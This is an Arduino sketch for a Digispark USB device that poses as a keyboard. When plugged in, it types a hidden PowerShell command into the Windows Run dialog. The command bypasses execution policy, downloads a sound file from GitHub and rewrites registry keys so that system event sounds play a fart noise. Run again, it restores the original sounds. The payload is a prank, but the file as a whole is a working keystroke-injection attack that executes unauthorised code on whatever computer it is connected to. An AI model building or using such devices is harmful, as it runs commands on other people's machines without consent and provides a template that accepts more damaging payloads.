#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print(F("powershell -NoProfile -ExecutionPolicy Bypass -Command \""
    "# Configurazione personalizzata\n"
    "$events = @(\n"
    "    @{ Name='SystemStart';    Original='Windows Startup.wav' },\n"
    "    @{ Name='DeviceConnect'; Original='Device Connect.wav' },\n"
    "    @{ Name='Power';         Original='Windows Battery Low.wav' }\n"
    ");\n"
    "$customUrl = 'https://raw.githubusercontent.com/NicolaLepore4/Digi-sounds/main/sounds/fart.wav';\n"
    "$localPath = Join-Path $env:APPDATA 'SuoniPersonalizzati\\fart.wav';\n"
    "$appDataDir = Split-Path $localPath -Parent;\n"
    
    "# Controlla se è già attivo il suono personalizzato\n"
    "$customActive = $false;\n"
    "foreach ($event in $events) {\n"
    "    $regPath = 'HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\' + $event.Name + '\\.Current';\n"
    "    $current = (Get-ItemProperty -Path $regPath -Name '(Default)' -ErrorAction SilentlyContinue).'(Default)';\n"
    "    if ($current -eq $localPath) { $customActive = $true }\n"
    "}\n"
    
    "# Logica toggle\n"
    "if ($customActive) {\n"
    "    # Ripristina tutti i suoni originali\n"
    "    foreach ($event in $events) {\n"
    "        $regPath = 'HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\' + $event.Name + '\\.Current';\n"
    "        $original = Join-Path 'C:\\Windows\\Media' $event.Original;\n"
    "        Set-ItemProperty -Path $regPath -Name '(Default)' -Value $original;\n"
    "    }\n"
    "    Remove-Item -Path $localPath -Force -ErrorAction SilentlyContinue;\n"
    "} else {\n"
    "    # Scarica e imposta il suono personalizzato\n"
    "    if (-not (Test-Path $appDataDir)) { New-Item -ItemType Directory -Path $appDataDir -Force };\n"
    "    try {\n"
    "        Invoke-WebRequest $customUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop;\n"
    "        foreach ($event in $events) {\n"
    "            $regPath = 'HKCU:\\AppEvents\\Schemes\\Apps\\.Default\\' + $event.Name + '\\.Current';\n"
    "            Set-ItemProperty -Path $regPath -Name '(Default)' -Value $localPath;\n"
    "        }\n"
    "    } catch {}\n"
    "}\n"
    "\""));
    
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
